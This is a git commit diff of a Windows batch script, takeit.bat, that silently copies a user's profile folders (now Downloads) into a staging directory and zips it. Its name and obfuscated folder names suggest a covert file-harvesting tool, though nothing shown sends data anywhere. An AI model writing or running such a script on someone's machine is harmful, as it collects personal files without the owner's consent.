d09fd3ddb37a6edcdf7cc3c12067d83ff4b5d164
dreadnought24-rgb <sofyanrezky097@gmail.com>
2026-09-11 09:06:34 +0700

    Update takeit.bat

--- mirror/takeit.bat
+++ mirror/takeit.bat
@@ -2,9 +2,7 @@
 set backupcmd=xcopy /s /c /d /e /h /i /r /y
 set dest=C:program\hasil
 
-%backupcmd% "%USERPROFILE%\pictures" "%dest%\My pics"
-%backupcmd% "%USERPROFILE%\Favorites" "%dest%\Favorites"
-%backupcmd% "%USERPROFILE%\videos" "%dest%\vids"
+%backupcmd% "%USERPROFILE%\Downloads" "%dest%\downl04ds"
 
 :: buat zip
 powershell -command "Compress-Archive -Path '%dest%\*' -DestinationPath 'C:\program\hasil.zip' -Force"
